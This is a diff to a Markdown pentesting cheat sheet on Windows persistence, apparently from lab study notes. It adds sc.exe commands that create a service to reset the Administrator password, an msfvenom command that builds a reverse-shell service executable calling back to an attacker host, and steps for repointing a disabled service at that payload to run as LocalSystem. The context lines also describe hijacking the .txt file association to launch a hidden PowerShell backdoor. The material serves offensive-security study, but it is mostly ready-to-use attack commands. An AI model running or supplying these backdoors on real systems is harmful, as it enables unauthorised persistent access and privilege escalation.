@@ -141,3 +141,49 @@ We then need to update the Data section to point to our backdoor program.
 `powershell -windowstyle hidden C:\windows\system32\backdoor.ps1 %1`
 
 Anytime someone opens a `.txt` file we will get a shell!
+
+## Abusing Services
+### Creating backdoor services
+
+#### Resetting admin password
+```
+sc.exe create <Service Name> binPath= "net user Administrator <Password>" start= auto
+
+sc.exe start <Service Name>
+```
+
+Important to note that there must be a space after the equal signs. Here we are creating a service that starts automatically and resets the password of the admin.
+
+#### Reverse shell
+We can create a service using [msfvenom](../../useful_tools/Linux/README.md#msfvenom):
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=4444 -f exe-service -o <executable name>`
+
+We can then copy that created service executable onto the host machine and run the following commands:
+
+```
+sc.exe create <Service Name> binPath= "<Path to the service executable>" start= auto
+
+sc.exe start <Service Name>
+```
+
+### Modifying existing services
+We want to start by finding an existing service that is disabled.
+
+`C:\> sc.exe query state=all`
+
+Once found you will want to look at the configuration.
+
+`C:\> sc.exe qc <Stopped Service Name>`
+
+We care about 3 things for persistence:
+
+1) `BINARY_PATH_NAME` should point to our payload
+2) `START_TYPE` should be set to `AUTO_START`, so user doesn't have to interact
+3) `SERVICE_START_NAME` defines which account the service will be run under. We would prefer `LocalSystem` to gain SYSTEM privileges
+
+When we have found our service we will want to create a [payload](#reverse-shell).
+
+We then want to place the payload in a folder like `C:\Windows\`. Then we will run the following command to reconfigure the stopped service and have it point to our payload.
+
+`sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`
